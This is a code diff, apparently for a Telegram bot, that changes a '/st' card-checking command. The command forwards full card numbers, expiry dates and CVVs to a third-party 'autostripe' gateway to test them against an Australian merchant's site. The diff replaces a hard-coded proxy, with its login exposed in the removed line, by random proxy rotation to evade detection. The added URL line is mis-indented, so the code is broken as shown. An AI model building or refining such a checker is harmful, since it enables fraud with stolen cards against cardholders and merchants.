@@ -9,6 +9,7 @@ sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
 from utils.database import get_credits, set_credits, get_plan, is_premium, increment_daily_usage, can_use_free_command
 from utils.bin_database import get_bin_info
 from config import ADMIN_ID
+from config import get_random_proxy
 
 def setup_stripe_auth_command(bot):
     @bot.message_handler(commands=['st'])
@@ -80,9 +81,8 @@ def process_stripe_auth(bot, message):
         # Enviar mensaje de procesamiento
         processing_msg = bot.reply_to(message, "🔄 Procesando tu tarjeta...")
         
-        # Construir URL de Stripe
-        stripe_url = f"https://rockyysoon.onrender.com/gateway=autostripe/key=rockysoon?site=buildersdiscountwarehouse.com.au&cc={cc_number}|{expiry_month}|{formatted_year}|{cvv}&proxy=p.webshare.io:80:bhiyynnu-rotate:hq37ts3k50kz"
-        
+        proxy = get_random_proxy()
+stripe_url = f"https://rockyysoon.onrender.com/gateway=autostripe/key=rockysoon?site=buildersdiscountwarehouse.com.au&cc={cc_number}|{expiry_month}|{formatted_year}|{cvv}&proxy={proxy}"
         # Hacer la solicitud simple con requests
         start_time = time.time()
         response = make_simple_request(stripe_url)
